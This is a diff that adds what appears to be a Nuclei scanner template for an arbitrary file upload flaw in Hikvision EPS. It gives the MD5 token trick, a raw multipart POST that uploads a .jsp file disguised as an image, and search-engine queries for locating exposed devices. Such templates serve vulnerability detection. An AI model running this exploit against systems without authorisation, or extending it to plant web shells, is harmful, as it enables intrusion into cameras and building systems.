@@ -1,0 +1,46 @@
+id: hikvision_eps_token_upload
+
+info:
+  name: hikvision_eps_token_upload
+  author: Xc1Ym
+  severity: critical
+  description: hikvision_eps_token任意文件上传，请求地址中的token为`URL/eps/api/resourceOperations/uploadsecretKeyIbuilding`的MD5值
+  metadata:
+    max-request: 1
+    fofa-query: icon_hash="-911494769"
+    hunter-query: web.body="/views/home/file/installPackage.rar"
+    verified: true
+  tags: upload,iot,hikvision,hw,intrusive
+
+variables:
+  payload: '{{rand_base(6)}}'
+  filename: '{{rand_base(6)}}'
+  token: '{{RootURL}}/eps/api/resourceOperations/uploadsecretKeyIbuilding'
+
+http:
+- raw:
+  - |
+    POST /eps/api/resourceOperations/upload?token={{md5("{{token}}")}} HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Connection: close
+    Cookie: ISMS_8700_Sessionname=A29E70BEA1FDA82E2CF0805C3A389988
+    Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryGEJwiloiPo
+    Upgrade-Insecure-Requests: 1
+    Content-Length: 174
+
+    ------WebKitFormBoundaryGEJwiloiPo
+    Content-Disposition: form-data; name="fileUploader";filename="{{filename}}.jsp"
+    Content-Type: image/jpeg
+
+    {{payload}}
+    ------WebKitFormBoundaryGEJwiloiPo
+
+  matchers:
+    - type: binary
+      part: body
+      binary:
+        - e4b88ae4bca0e99984e4bbb6e68890e58a9f
+# digest: 4b0a00483046022100f246bc10ec113081474dd5442c7af04f1d06c99f7f15afaa0cc193da5f5096e9022100ff1b4499301a8f829e0929f01f8d2c718bde207344225310a7c8d2adaaa15fae:6b2dd5af372f02ed15a56faf8ad98cf9
